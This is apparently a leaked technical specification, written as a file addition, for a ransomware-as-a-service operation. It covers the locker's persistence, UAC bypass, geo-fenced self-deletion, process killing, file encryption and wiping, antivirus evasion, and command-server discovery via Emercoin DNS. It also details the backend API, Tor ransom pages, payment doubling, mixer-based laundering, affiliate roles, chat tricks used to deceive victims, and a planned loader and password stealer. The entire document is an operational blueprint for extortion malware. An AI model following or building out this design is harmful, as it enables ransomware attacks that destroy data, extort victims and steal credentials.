@@ -1,0 +1,491 @@
+Sentence
+CRYPTOLOCKER AND ADMIN
+Technical Specifications
+PURPOSE
+To write a cryptolocker and backend/admin for it taking into account current market realities.
+ROLES IN THE SYSTEM
+There are the following roles:
+- admin (us)
+"- Advert (partner, registers in our system to earn money)"
+- victim
+"- Recoverer (intermediary between the victim and us, plays for the victim)"
+BUSINESS MODEL AND PAYOUTS
+All payments to adverts go in transit through our wallets.
+The victim pays to a bitcoin address linked to the system owner's wallet.
+"From this wallet, the money is sent to the adverts; our commissions are deposited in the wallet."
+"Thus, the advert does NOT CONTROL the bitcoin addresses that are specified on the landing pages,"
+and CANNOT specify his addresses and CONTACTS on the landing page.
+"In general, a landing page must be strictly censored by the system."
+"When an Advertiser creates a new target, we assign one of our bitcoin addresses to the target."
+This address is selected from the pool of addresses (linked to our wallet) set in the system settings.
+"The system tracks the movement to the addresses assigned to the adverts, and forwards all incoming payments minus the commission on the advert"
+to the addresses specified by the adverts themselves.
+This scheme requires increased security when working with the master wallet.
+Only the owner of the system should have access to it.
+It's like cryptocurrency exchanges.
+"Recovery companies have a special role in this business, and it requires specific support in software."
+"As a rule, recavers ask us for a discount, buy out the anlocker, and sell it to the victim at a nominal price."
+Their profit is this discount.
+So to support these actions there are the following features:
+- private chat and clearing chat history
+- commands in chat to hide the anchor and manage the landing page.
+The point of them is to hide from the victim the fact that the anchor is available.
+BOTH LOCKER
+0.
+The bot must check its IP against online geo-databases.
+PRESENCE OF IP-ADDRESS IN THE CIS ZONE LEADS TO IMMEDIATE TERMINATION AND DELETION FROM DISK!
+How to get your external address see p.7.
+1.
+the bot must ensure its persistence in the system (to be saved between reboots).
+https://habr.com/ru/post/425177/
+2. the bot should be granted the maximum possible privileges in the system:
+3.
+The bot must bypass UAC:
+https://github.com/hfiref0x/UACME
+(working methods are somewhere around mid 30's...).
+Do not try it on a personal machine!
+It may damage the OS.
+"4. When installed on the system, the bot must generate an ID."
+The bot ID is a string consisting of two dot-separated components.
+"The first part has the format %MACHINE%-%USER%_XYYYYYYYYY, where"
+MACHINE - computer name
+USER - user name
+X - symbol denoting the type of system the client is running on.
+"(W - windows, L - linux, A - android, M - Mac OS),"
+"YYYYYYYYYY - 3-7 digits containing major-version, minor-version and build of the operating system, if there are any such systems"
+"(for example, for 6.1 build 7600 it will be 617600)."
+"The second part contains 32 random characters 0-9, A-F."
+An example of a client id is HOSTNAME-USER_W617600.11223344556677889900AABBCCDDEEFF.
+The parameter is not case sensitive.
+5.
+"The bot has the name of its group - a string of six characters, the first three characters are lower case Latin, the rest are numbers."
+6.
+"The bot must have a builder attached to it, flashing its group and other essential parameters into the bot at the layout stage."
+The task of the builder is to flash into the bot the resources to be modified without giving access to the source code.
+The following scheme is proposed:
+- Bilder receives .obj-files as input
+"- .obj-file containing resources to be modified (group, etc.) is compiled from source (or processed by some utility)."
+7.
+The bot should collect the following information about the environment:
+- OS version and build
+- list of network interfaces with IP addresses
+- external IP address
+https://habr.com/ru/company/emercoin/blog/335458/
+https://github.com/emercoin/emercoin/blob/master/src/stun.cpp
+// list of installed programs
+This data is sent to the command server.
+The bot gets the address of the command server via Emercoin DNS domain resolving.
+8.
+"Once installed and anchored in the system, the bot starts encrypting files in the system using the following algorithm:"
+8.1 The encryption algorithm is optionally ChaCha or another streaming asymmetric cipher.
+Crypto algorithm requirements:
+- streaming (designed for fast stream processing)
+- fast
+- asymmetric (there are private and public keys)
+- there is an open implementation in C.
+"We do not try to implement crypto algorithms ourselves, we take only ready-made variants!"
+8.2 The program encrypts files with the public key embedded in it.
+"After the file is processed, a file with the same name and double extension .txt.crypted is created next to it,"
+which contains the lending-text.
+8.2.1 Take into account that the file extension is signature #1 for antiviruses.
+"You may want to use standard extensions (.txt) instead of non-standard ones (.crypted, .crypt, etc.) as much as possible."
+8.3
+The program works in one of two modes: fast or full.
+"In fast mode, only the first megabyte of the file is encrypted."
+This is necessary to cover the system quickly.
+"In full mode, the entire file is encrypted."
+8.4 Before starting the program kills processes from the list and stops services from the list.
+"In case of errors, the program tries to repeat the action three times with an interval of 2 minutes."
+Further work does not depend on the result of this step.
+8.5
+"The program first processes directories from a special ""fast"" list - the list of directories,"
+which must be passed through first.
+8.6.
+The program DOES NOT touch files and directories from a special stop list - a list of files that cannot be touched.
+The combinations of the quick list and the stop list are handled in this way:
+8.6.1.
+We cover all paths from the quick list that are not on the stop list
+"8.6.2 If the entire disk is in the stop list, we cover only the paths from the quick list on that disk, without touching the rest of the disk"
+"8.6.3 If the stop list is empty, cover the folders from the quick list first; cover the rest of the files later."
+8.7.
+The program encrypts only files with extensions from the list of working extensions; the rest are ignored.
+8.8.
+The program deletes files from the special list by overwriting their contents three times:
+- first time with constant 0
+- second time with constant FF
+- third time with random garbage
+- the fourth time the file is deleted
+8.9.
+The program processes all disks in this way.
+All errors during operation are ignored.
+"Thus, there are the following lists:"
+9.
+List of changeable settings in the program:
+9.1.
+Group
+9.2.
+encryption key
+9.3. list of processes and services
+9.4.
+quick list
+9.5.
+stop list
+9.6. list of working extensions
+9.7.
+delete list
+9.8. landing page text
+9.9. command server address
+"All these data (except 9.1, 9.9) the program tries to request from the command server via the Tor network, ten attempts, interval 1 minute."
+"If unsuccessful, the program uses the stored values, periodically resuming attempts to update the settings."
+BACKEND'A API
+POST /HELLO
+HTTP/1.1
+The request is executed at program startup (both initial and repeated after reboot).
+The content of the HTTP request body is an application/x-www-form-urlencoded container with the following fields:
+cid - client ID
+group - client group
+ip1 - address of the first network interface
+ip2 - address of the second network interface
+...
+ipN - external IP address
+"If the bot receives a 406 response code and a Not allowed response, the bot is immediately terminated and removed from disk."
+"In turn, the backend should issue this code and response if it detects that any of the IP addresses provided in the request"
+is in the CIS zone.
+GET /<cid>/<group>/<setting>
+HTTP/1.1
+Setup request.
+Here
+<cid> - client ID
+<group> - client group
+"<setting> - setting, enum of the"
+key (public encryption key)
+services (list of processes and services - separated by semicolons.
+"If the field has a .exe substring, it is the name of the process."
+"If not, it is the name of the service)."
+priority list
+stoplist
+ext
+wipe list
+landing
+The format of the lists is semicolon-separated.
+"The landing page is given as is, UTF8 encoding."
+Key - convenient for work through WinCrypt format (base64 wrapped if necessary).
+POST /<cid>/<group>/stat
+Sending statistics
+The content of HTTP request body is application/x-www-form-urlencoded container with the following fields:
+total - total files processed
+crypted - total files encrypted
+wiped - total files deleted
+ignored - total files skipped
+"Statistics is sent every 15 minutes, the time is set as a constant in the program."
+LANDING PAGE
+There are two landing pages in total:
+- on a computer
+- on the Internet.
+"On the computer, next to the encrypted file is a text file with the same name and a different extension."
+This file should contain a simple link to the page in the .onion domain and instructions on how to download the tor-browser.
+"For now, let's assume that the path to the landing page is the base .onion domain plus a path equal to md5(bot ID)."
+"It's simple, and prevents brute force picking up pages of other targets."
+"If a tor-domain was specified in the target's properties, the page should open on that domain as well."
+Automatic management of tor-domains - a separate topic.
+You can prepare 100500 of them and assign them from the blanks.
+"To the landing page is a strict requirement to prohibit direct contact with the victim, except through our chat:"
+"- everything that even slightly resembles a bitcoin address must be brutally rejected when loading page text into the admin,"
+and deleted when the page text is saved.
+"- Instead, the address for payments should be replaced by a macro."
+"Let's say, %PAYMENT_ADDRESS%."
+"- in the text should not get contacts of the admin (e-mail, jabber and all possible phones, messengers, IRC, etc.)."
+When updating the text of the page in the admin area should automatically check and reject pages with attempts to
+to write contacts and wallets on them.
+"Probably, it is also possible to make some kind of pre-moderation, with approval of changes on pages by our system operators."
+"In general, you can make a customized landing page only for advanced users, and for the majority of users"
+"make standard texts, with substitution of basic data from macros."
+Macros:
+%PAYMENT_ADDRESS% - bitcoin wallet for payment (taken from the target's profile)
+%DOUBLE_DATE% - date of doubling the payout
+%LANDING_URL% - link for the landing file - a basic URL to which the bot will glue its own id to get a full link to the landing page on the Internet.
+The appearance of the pages is approximately as follows (competitor samples):
+http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/837F964AF6B77803#info
+http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/F32917DB2AA982C9#info
+Do not plagiarize!
+The meaning should be preserved:
+"- there should be information on how to buy bitcoins, a list of sites and exchanges"
+- chat login
+- form for test decryption of the file.
+"Test file decryption can be used only once and only for image files,"
+as they usually do not carry important information.
+"When giving the decrypted result, you should check the file contents by signature."
+"If the signature of any of the allowed types does not match, do not give the content and write atata."
+"Allowed types: jpg, png, gif, bmp."
+The page changes its appearance depending on the target's state:
+"- if the target has not paid and the next payment deadline has not expired, the page has a normal appearance"
+"- if the target has not paid and the next payment period has expired, the page has a warning and a new amount (doubled every period)."
+"- if the target has paid, there is a link to download an anchor."
+IMPORTANT: the amount payable on the landing page is ALWAYS displayed without discount!
+IMPORTANT: the visibility of the link to the anchor is ALWAYS controlled by the corresponding flag from the target's properties (see below - the target has a separate flag
+"""anlocker available"" flag), NOT the PAYMENT FLAG!"
+IMPORTANT: the view of the landing pages can be controlled by commands from the chat after the PAYMENT FACT has been FIXED to our bitcoin address.
+(it is necessary to have a transaction with the required amount to our assigned address from the target's profile).
+Two things can change:
+"- switching the page between ""not paid"" and ""paid"" view and the corresponding availability of the link to the anlocker"
+- bitcoin address for payment.
+"All these actions are done by the recovery, only after you have paid us and we have recorded it."
+BEFORE PAYMENT these actions are NOT available!
+ADMINKA
+"There are several roles in the admin area (by admin area we mean not only the part of the system accessible to administrators, but also the web application in general):"
+"- admin - sees everything, creates any accounts"
+"- Advert - sees only his own data, does not see data of neighboring advert, sees chats by his bots and targets."
+- victim - sees only his chat
+ADMIN SECTION
+This describes the list of pages visible only to the admin (page name and list of properties or information on it):
+* Dashboard with statistics:
+- total admins
+- total bots
+- bots active for the last 24 hours
+- total payments
+* System settings
+- A list (pool) of free bitcoin addresses that can be assigned to the advert's targets.
+Only those that have not yet been assigned to advert targets are available for modification.
+This page will be read-only in the implementation with automatic clearing (see below).
+* Account Management (Advert Profiles)
+This page lists the adverts (accounts) with the following table columns:
+- name
+- commission (percentage)
+- (per/at a time) block an advert
+- edit addvert
+And also the button
+- create a new advert
+Blocking an account means that the advert will no longer be able to log in to his account.
+All payments to his wallet are suspended.
+"When creating a new advert, he is assigned a bitcoin address by the PROXY system, to which payments from victims are made."
+This address is not visible to the advert himself.
+"In editing the profile of an advert, you can change the fields:"
+- name
+- commission
+"- personal bitcoin-address of the advert (THIS IS NOT THE ADDRESS, which will be assigned to the target by us!)."
+"This is the SECOND address, which is available for editing by both the admin and the advert."
+"For address assignments, see the ""ADVERTISEMENTS"" section."
+- withdrawal via mixer
+- mixer bitcoin address
+- mixer time
+- mixer fee
+These fields need to be specified - depends on what features the bitmix API provides.
+"It is possible that the time and commission are not controlled by us, but are assigned by the mixer automatically."
+Advanced statistics should also be visible for each advert
+- total profit
+- total bots
+"This stat should not be generated when opening the page, but should be loaded on a separate button/link."
+(we do so because the statistic most likely makes heavy requests to the database).
+ADVERTISEMENT SECTION
+The list of pages visible to the advert is described here.
+* Targets
+The following fields are visible in the list:
+- title
+- group
+- number of bots
+- activity time of the last bot
+- edit
+"- list of bots (a separate page opens, see below)"
+- delete/archive.
+"Also at the top of the page is the ""Add"" button."
+You can only delete a target that has had 0 taps.
+You can only send a target that had taps (i.e. the database has information about bots with the specified group) to the archive.
+The archive is a separate section with targets with all the same information and only for viewing.
+When creating/editing a goal there are the following fields:
+** general
+- name
+"- short name of the group, validated by the following rule:"
+"a string of 6 characters, the first three are lower case Latin, the rest are numbers."
+"The group is a unique field, and is the target identifier in the system."
+"The ""name"" field is used inside the admin area"
+"for easy display; the ""group"" field is used in various queries and interactions between parts of the system."
+- status: paid/not paid (can be set both manually and automatically by payment scripts).
+"If there was a payment, we need to output a list of payments from the bitcoin network with links to the transaction"
+in any blockchain explorer.
+"That is, the operator should know if there was a payment or if the payment flag was set manually."
+- chat nickname (operator by default)
+** payment
+- bitcoin address for payment (personal)
+- bitcoin-address of the recovery (optional); its purpose - see CHATS section
+- payout amount
+"- payout deadline, after which doubling starts (optional fields from here on)"
+"- doubling interval, in days"
+"- available discount (for recompanies), in percent (by default there is no discount, i.e. the value is 0)."
+Off by default.
+"See also under ""CHATS"" about disabling this option from chat."
+** lending
+- tor-domain (optional)
+"- Landing-text on the site (it is possible to make it an additional option, and by default use the standard text)"
+- landing-text in the file
+"- ""anlocker available"" - flag (checkbox) whether the anlocker on the landing page is available for downloading"
+"- flag ""test decryption available"" (reset when test decryption is used)"
+** locker settings
+- key type (private/group)
+The only difference here is how many bots can use one key.
+- private and public keys in human-understandable form
+ATTENTION!
+SEE ABOUT VALIDATION OF LENDING-TEXTS IN THE CORRESPONDING SECTION!!!!
+- list of stopped services and processes
+- list of priority directories
+- list of ignored paths and masks
+- list of working extensions
+- list to delete
+All lists are ; (semicolon) separated valid Windows path and file masks.
+"In addition, the target's properties store the private encryption key, the locker program, and the anti-locker program."
+These properties are generated by the system when the target is created and are only available for viewing/downloading.
+"When a new target is created, a new bot build is generated for it and stored in the database/disk."
+The following data is passed to the bot creation script:
+- newly generated encryption key
+- handle text for the file
+- list of services and processes to be stopped
+- list of priority directories
+- list of ignored paths and masks
+- list of working extensions
+- list to delete
+"In response, the bot script creates two binaries - locker and anlocker."
+The specified properties are flashed into these binaries.
+"If a separate tor-domain is specified for the target, you need to ensure that the landing page works through it."
+"Accordingly, you need to automate the creation and raising of such domains."
+"As an option - domains can be prepared in advance in the number of HHH pieces, and the user will simply select them from the pool"
+(or it will be assigned to him automatically).
+* Bots
+"This is an information page with a list of bots for a specific selected target, sorted by date of last activity and fields:"
+- CID
+- group
+- target
+- last activity
+- chat
+"When you visit the bot's page, besides this information, the system information collected by the bot should also be available."
+CHATS
+You can enter the chat room in two ways:
+- from the target/bot page in the admin (operator/advert)
+- from the landing page (victim/recovery).
+"From the landing page, anyone with a link can enter the chat room."
+The mode of operation when several people enter the chat room from different addresses or browsers is not prohibited.
+The only condition is that the nicknames of such users must be different.
+The nickname of the administrator in the chat room is taken from his settings.
+The link to the chat is generated on the landing page in such a way that it cannot be guessed by brute force (i.e. an element of randomness is introduced).
+The chat is tied to a goal:
+"- if the target is a group key, then each bot in the group goes to the same chat room"
+"- if the target is a private key, then each bot is assigned to a separate chat room."
+"Adverts can only see their chats, admins can see everything."
+"When entering a chat room, the victim is presented with an invitation (like in IRC channels) and a"
+a message saying that you can type /help to view available commands.
+The chat has the following commands:
+/help
+displays text about the private and clear commands with their descriptions.
+The unpaid command is excluded from the prompt
+/private
+Makes the chat invisible to other chat participants on the victim's side (i.e. if more than one person is sitting in the chat on the victim's side).
+sits in the chat on the victim's side).
+From the admin/advert side it has no effect on anything - the chat history is fully visible.
+/clear
+Clearing the chat history from the victim's side.
+From the admin/advert side has no effect on anything - the chat history is full.
+/unpaid
+"Turns off the ""link to anlocker available"" flag."
+"This and subsequent commands are reported in chat by the advert, for the recovery company, after agreement on payment and discount has been reached."
+no more // -Available ONLY after receiving payment to bitcoin-address of the target.- crossed out
+"The command is NOT available when setting the ""paid"" flag manually from the admin area!"
+"The command turns off the flag ""anlocker available"" in the target's profile and changes the view of the landing page accordingly."
+/bitcoin <address bitcoin>
+Changes the address of the wallet for payment on the landing page.
+Available ONLY after receiving payment to the target's bitcoin address.
+"COMMAND is NOT available when setting the ""paid"" flag manually from the admin!"
+/paid
+"Sets the ""paid"" flag."
+ACCESSIBLE ONLY after receiving payment to the bitcoin address of the target.
+"COMMAND IS NOT ACCESSIBLE when setting the ""paid"" flag manually from the admin area!"
+"The command enables the flag ""anlocker available"" in the target's profile and changes the view of the landing page accordingly."
+The commands are intended for recavery actions only.
+The general scenario is as follows:
+- the recaver opens a private chat
+- the recaverie introduces itself and negotiates a discount/payment terms
+"- in response, the operator from our side tells it the command to hide the fact of payment - /unpaid"
+- The recaverie uses the command /unpaid to disable the link to the anlocker and /bitcoin to change the bitcoin payment address on the landing page.
+This must be done BEFORE payment!
+"- after confirming the payment, the operator will give the link to anlocker in private chat."
+"- after receiving payment from the victim to his/her address, the recavery can switch the page view to give the victim access to the anlocker."
+CRIPTOVALUTES
+We want to support other cryptocurrencies besides bitcoin - more
+* dash
+* zcash
+* monero
+Everything written in this ToR regarding bitcoin should be implemented for these cryptocurrencies as well.
+"For example, if in the properties of a record in the database it is required to specify the bitcoin address, then it is necessary to specify the addresses for the other currencies as well."
+for the other currencies.
+CLEARING AND PAYMENT SCRIPTS
+"Clearing is the settlement with adverts, paying them what is owed."
+"Depending on what clearing scheme will be chosen (manual or automatic),"
+the complexity and convenience of the system will vary.
+Manual clearing:
++ is fully protected from wallet theft by staff and competitors
+- requires additional daily work on distribution of funds
+- requires additional manual work on system maintenance (address generation)
+Automatic clearing:
++ you can completely automate everything
+- your wallet is available to everyone who has access to the system (trust issue).
+Purpose of payment scripts:
+1) tracking bitcoin payments to our addresses
+2) clearing (automatic sending of money to the addresses of adverts)
+3) generating a pool of bitcoin addresses to assign to targets.
+The first script will be in any clearing option; the second and third will be in automatic clearing only.
+The scripts must be hosted and executed on a separate server with increased security.
+The database is communicated with over the network.
+AUTOMATIC CLEARING
+"If automatic clearing is to be done, then it is likely to be impossible to do without raising a full node of bitcoin."
+"On the payment server there is a wallet to which generated bitcoin-addresses are bound,"
+and a full bitcoin node is raised.
+Clearing can be done either directly to the adverts' wallets or through mixers.
+"In case of working through mixers, in the general settings of the system you need to specify:"
+"- option ""clearing via mixer"""
+- mixer bitcoin address
+- mixer time
+- mixer commission
+OR
+the same options can be in the advert's profile (editable by admin).
+There are three cron jobs:
+"1) checks incoming payments to each of the bitcoin addresses we have assigned to targets,"
+and marks the targets as paid if the amount is sufficient.
+"2) for paid targets, automatically generates outgoing payments to adverts' addresses"
+(incoming amount minus commission).
+"3) checks the stock of free addresses in the database, if necessary, generates new addresses and stores them in the database."
+All this can be done in a lot of ways:
+- a full bitcoin node has a bitcoin-cli utility that can do everything you need to do
+- via JSON-RPC (lift on a full node)
+MANUAL CLEARING
+In this case you can do without a full bitcoin node.
+"1) To check the payment status of a bitcoin address, several approaches can be used:"
+- Use the native Bitcoin RPC API by connecting to a specific bitcoin server/s.
+There is already an out of the box solution for PHP:
+https://en.bitcoin.it/wiki/API_reference_%28JSON-RPC%29#PHP
+https://en.bitcoin.it/wiki/Original_Bitcoin_client/API_calls_list
+- Use the API of blockchain explorers.
+"This option is worse, as blockchain explorers change addresses, APIs and generally are prone to change."
+"addresses, APIs, and in general are subject to frequent changes."
+For example:
+https://blockchain.info/q
+2) payments to adverts need to be processed manually.
+"To do this, you will need a report ""To payment"" in the admin, which should contain a list of addresses with amounts."
+list of addresses with amounts.
+The owner of the system downloads this report daily and manually makes payments.
+"3) In the same way, you need to manually generate new bitcoin addresses and upload them to the admin,"
+on a separate page in the system settings.
+*************************
+SECOND VERSION
+The following needs to be provided:
+1.
+"a new loader is needed, which will load and run the load in batches (several .exe at once)"
+2. pwgrab styler should be adapted to dump data into storage:
+- replace DPOST protocol with file transfer protocol.
+- get the address of the command server via Emercoin DNS
+- bot CID
+"- Bot CID should be generated uniformly and unambiguously, regardless of the user,"
+so that its generation can be repeated in the styler.
+"It is probably necessary to completely separate pwgrab from browsers engine,"
+cutting off all unnecessary stuff and making it minimalistic (remove left and duplicate code).
+3.
+There should be a section in the admin to view merged passwords.
+Binding to the advert; be sure to memorize the ID of the bot/machine.
+4.
+Obtaining the address of the command server via Emercoin DNS.
